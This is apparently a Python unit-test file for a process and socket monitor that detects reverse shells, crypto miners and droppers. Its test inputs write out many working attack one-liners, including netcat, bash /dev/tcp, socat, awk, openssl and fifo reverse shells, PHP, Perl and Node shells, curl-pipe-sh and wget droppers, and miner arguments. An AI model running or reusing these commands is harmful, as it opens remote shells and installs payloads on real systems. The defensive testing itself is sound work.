#!/usr/bin/env python3
"""ProcessMonitorAgent flags real reverse-shell/miner indicators, not admin one-liners (2026-10-10).
Run:  swarmsentinel-env/bin/python3 backend/tools/test_process_monitor.py"""
import os
import sys
import unittest
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path[:0] = [os.path.join(os.path.dirname(HERE), 'agents'), os.path.dirname(HERE)]
import agent_runner as R  # noqa: E402

C = R.ProcessMonitorAgent.classify


class Benign(unittest.TestCase):
    def test_admin_python_one_liner_is_not_flagged(self):
        self.assertIsNone(C('bash -c cd /mnt/ssd/SwarmSentinel/backend && ../swarmsentinel-env/bin/python -c "import sqlite3; print(1)"'))
        self.assertIsNone(C('/usr/bin/python3 -c "print(1)"'))

    def test_substrings_of_other_words_are_not_flagged(self):
        self.assertIsNone(C('/usr/lib/dnscatalog/refresh --config x'))
        self.assertIsNone(C('/usr/bin/minerd-docs-viewer'))
        self.assertIsNone(C('nc -z localhost 22'))


class Malicious(unittest.TestCase):
    def test_miner_binaries(self):
        self.assertEqual(C('/tmp/.x/xmrig --donate-level 1'), 'xmrig')

    def test_netcat_with_exec_flag(self):
        self.assertEqual(C('nc -e /bin/sh 10.0.0.9 4444'), 'netcat-exec')
        self.assertEqual(C('/usr/bin/ncat 10.0.0.9 4444 -e /bin/bash'), 'netcat-exec')

    def test_bash_devtcp(self):
        self.assertEqual(C('bash -i >& /dev/tcp/10.0.0.9/4444 0>&1'), 'bash-devtcp')

    def test_interpreter_reverse_shell(self):
        self.assertEqual(C('python3 -c import socket,os,pty;s=socket.socket();os.dup2(s.fileno(),0);pty.spawn("sh")'),
                         'interpreter-revshell')
        self.assertEqual(C('perl -e use Socket;socket(S,PF_INET,SOCK_STREAM,6);exec("/bin/sh")'), 'interpreter-revshell')


class Added20261115(unittest.TestCase):
    """Rules added in the 2026-11-15 sync. Documentation addresses only."""

    def test_busybox_and_toybox_wrappers(self):
        self.assertEqual(C('busybox nc 203.0.113.9 4444 -e /bin/sh'), 'busybox-netcat-exec')
        self.assertEqual(C('/bin/toybox nc -e /bin/sh 203.0.113.9 4444'), 'toybox-netcat-exec')
        self.assertIsNone(C('busybox ls -la /tmp'))

    def test_long_exec_options(self):
        self.assertEqual(C('ncat 203.0.113.9 4444 --exec /bin/bash'), 'netcat-exec')
        self.assertEqual(C('ncat --sh-exec=/bin/sh 203.0.113.9 4444'), 'netcat-exec')

    def test_socat_exec(self):
        self.assertEqual(C('socat TCP:203.0.113.9:4444 EXEC:/bin/bash,pty,stderr'), 'socat-exec')
        self.assertEqual(C('socat tcp-connect:203.0.113.9:4444 system:sh'), 'socat-exec')
        self.assertIsNone(C('socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80'))

    def test_awk_inet(self):
        self.assertEqual(C('awk BEGIN {s = "/inet/tcp/0/203.0.113.9/4444"; while(1){ s |& getline c; print c |& s}}'), 'awk-inet')
        self.assertIsNone(C("awk -F: '{print $1}' /etc/passwd"))

    def test_openssl_and_fifo_shells(self):
        self.assertEqual(C('openssl s_client -quiet -connect 203.0.113.9:443'), 'openssl-shell')
        self.assertIsNone(C('openssl s_client -connect example.com:443'))
        self.assertEqual(C('sh -c mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc 203.0.113.9 4444 > /tmp/f'), 'fifo-shell')
        self.assertEqual(C('bash -c mkfifo /tmp/s; sh -i </tmp/s | openssl s_client -quiet -connect 203.0.113.9:443 >/tmp/s'),
                         'fifo-shell')

    def test_droppers_from_a_bare_address(self):
        self.assertEqual(C('sh -c curl -fsSL http://203.0.113.9/x.sh | sh'), 'ip-dropper')
        self.assertEqual(C('wget http://198.51.100.4:8080/bot -O /tmp/bot'), 'ip-dropper')
        self.assertEqual(C('sh -c wget -q http://203.0.113.9/k; chmod +x k; ./k'), 'ip-dropper')
        self.assertIsNone(C('curl -fsSL https://example.com/install.sh'))
        self.assertIsNone(C('curl http://127.0.0.1:5000/health'))
        self.assertIsNone(C('curl http://203.0.113.9/status'))                  # fetched but not run

    def test_programs_in_hidden_temp_folders(self):
        self.assertEqual(C('/tmp/.ICE-unix/.x/run --quiet'), 'hidden-temp-program')
        self.assertEqual(C('/dev/shm/.cache'), 'hidden-temp-program')
        self.assertEqual(C('python3 /var/tmp/.sys/agent.py'), 'hidden-temp-program')
        self.assertEqual(C('bash /tmp/.hidden.sh'), 'hidden-temp-program')
        self.assertIsNone(C('/tmp/.mount_CursorXyz/cursor --no-sandbox'))            # AppImage mounts are normal
        self.assertIsNone(C('/home/user/.vscode-server/bin/node server.js'))         # hidden folder, but not a temp dir
        self.assertIsNone(C('/tmp/ollama123/runners/cpu/ollama_llama_server'))

    def test_miner_arguments_on_a_renamed_binary(self):
        self.assertEqual(C('/usr/local/bin/systemd-helper -o stratum+tcp://203.0.113.9:3333 -u wallet'), 'miner-args')
        self.assertEqual(C('./kthreadx --donate-level=1 -o 203.0.113.9:14444'), 'miner-args')
        self.assertEqual(C('./svc --algo=rx/0 --url 203.0.113.9:3333'), 'miner-args')
        self.assertIsNone(C('hashcat --algo-list'))

    def test_wider_reverse_shell_code(self):
        self.assertEqual(C('php -r $s=fsockopen("203.0.113.9",4444);proc_open("/bin/sh",[0=>$s,1=>$s,2=>$s],$p);'),
                         'interpreter-revshell')
        self.assertEqual(C('node -e require("child_process").spawn("/bin/sh");var n=require("net");'), 'interpreter-revshell')
        self.assertEqual(C('perl -e use IO::Socket::INET;$c=IO::Socket::INET->new("203.0.113.9:4444")'), 'interpreter-revshell')
        self.assertEqual(C('bash -c exec 5<>/dev/udp/203.0.113.9/53'), 'bash-devtcp')

    def test_kernel_name_impersonation(self):
        F = R.ProcessMonitorAgent.impersonates_kernel
        self.assertTrue(F('4242', '1', '[kworker/0:1]'))
        self.assertFalse(F('77', '2', '[kworker/0:1]'))                       # a real kernel thread (child of kthreadd)
        self.assertFalse(F('2', '0', '[kthreadd]'))
        self.assertFalse(F('4242', '1', '/usr/sbin/sshd -D'))


class CpuPinnedFromTemp(unittest.TestCase):
    def agent(self):
        a = R.ProcessMonitorAgent.__new__(R.ProcessMonitorAgent)
        a.setup()
        a.sent = []
        a._submit = lambda **k: a.sent.append(k)
        return a

    def test_ten_minutes_at_full_cpu(self):
        a = self.agent()
        hits = [a.cpu_pinned('900', 95 * i, 100.0 * i) for i in range(1, 9)]  # 95% of a core, a scan every 100 s
        self.assertEqual(hits, [False] * 6 + [True, True])                    # pinned since t=100, reported at t=700

    def test_a_dip_resets_the_clock(self):
        a = self.agent()
        cpu = 0
        for i in range(1, 6):
            cpu += 95
            a.cpu_pinned('900', cpu, 100.0 * i)
        a.cpu_pinned('900', cpu + 10, 600.0)                                      # 10% for one interval
        self.assertFalse(any(a.cpu_pinned('900', cpu + 10 + 95 * j, 600.0 + 100 * j) for j in range(1, 6)))

    def test_scan_reports_only_programs_in_temp_directories(self):
        a = self.agent()
        ps = '\n'.join(['  900     1 www  {cpu} /tmp/kworkerd -B', '  901     1 alice  {cpu} /usr/bin/ffmpeg -i in.mp4 out.mkv'])
        clock = [0.0]
        with mock.patch.object(R.time, 'monotonic', side_effect=lambda: clock[0]), \
             mock.patch.object(R.ProcessMonitorAgent, 'program_path', side_effect=lambda pid, args: args.split()[0]):
            for i in range(9):
                clock[0] = 100.0 * i
                with mock.patch.object(R.subprocess, 'run', return_value=mock.Mock(stdout=ps.format(cpu=98 * i))):
                    a.scan()
        self.assertEqual([s['description'].split(')')[0] for s in a.sent], ['Suspicious process detected (cpu-hog-from-temp'])
        self.assertIn('/tmp/kworkerd', a.sent[0]['description'])


class Listeners(unittest.TestCase):
    """SocketWatchAgent: a loopback-only port from an ordinary program is not news; a network-reachable one or an odd owner is."""
    SS = ("State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\n"
          'LISTEN 0 4096 127.0.0.1:11434 0.0.0.0:* users:(("ollama",pid=1102,fd=3))\n'
          'LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:*\n'
          'LISTEN 0 511 [::1]:45123 [::]:* users:(("node",pid=3001,fd=20))\n'
          'LISTEN 0 1 127.0.0.1:4444 0.0.0.0:* users:(("nc",pid=4100,fd=3))\n'
          'LISTEN 0 1 127.0.0.1:7070 0.0.0.0:* users:(("svc",pid=4200,fd=3))\n'
          'LISTEN 0 2048 0.0.0.0:5000 0.0.0.0:* users:(("gunicorn",pid=61492,fd=3))\n'
          'LISTEN 0 128 *:8081 *:* users:(("python3",pid=5000,fd=3))\n')

    def parse(self):
        paths = {'4200': '/dev/shm/svc'}
        return R.SocketWatchAgent.listeners(self.SS, program_path=lambda pid: paths.get(pid, '/usr/bin/x'),
                                            cmdline=lambda pid: '')

    def test_loopback_from_ordinary_programs_is_ignored(self):
        got = self.parse()
        for port in (11434, 53, 45123):
            self.assertFalse(got[port]['exposed'] or got[port]['odd_owner'], port)

    def test_network_reachable_ports_count(self):
        got = self.parse()
        self.assertTrue(got[5000]['exposed'])
        self.assertTrue(got[8081]['exposed'])

    def test_odd_owner_on_loopback_counts(self):
        got = self.parse()
        self.assertTrue(got[4444]['odd_owner'])                 # netcat
        self.assertTrue(got[7070]['odd_owner'])                 # runs from /dev/shm

    def test_scan_reports_on_the_second_sighting_with_scope(self):
        a = R.SocketWatchAgent.__new__(R.SocketWatchAgent)
        a.setup()
        a.sent = []
        a._submit = lambda **k: a.sent.append(k)
        a.log = mock.Mock()
        with mock.patch.object(R.subprocess, 'run', return_value=mock.Mock(stdout=self.SS)), \
             mock.patch.object(R.ProcessMonitorAgent, 'program_path', side_effect=lambda pid, args: ''), \
             mock.patch.object(R, '_cmdline_of', return_value=''), \
             mock.patch.object(R.SocketWatchAgent, 'ALLOWED', {5000}):
            a._scan_listeners()
            self.assertEqual(a.sent, [])
            a._scan_listeners()
        urls = sorted(s['url'] for s in a.sent)
        self.assertEqual(urls, ['localhost:4444', 'localhost:8081'])
        self.assertIn('on this machine only', [s for s in a.sent if s['url'] == 'localhost:4444'][0]['description'])

    def test_mining_pool_ports_are_c2_ports(self):
        for port in (3333, 14433, 14444, 45560, 45700):
            self.assertIn(port, R.SocketWatchAgent.SUSPICIOUS_PORTS)


if __name__ == '__main__':
    unittest.main()
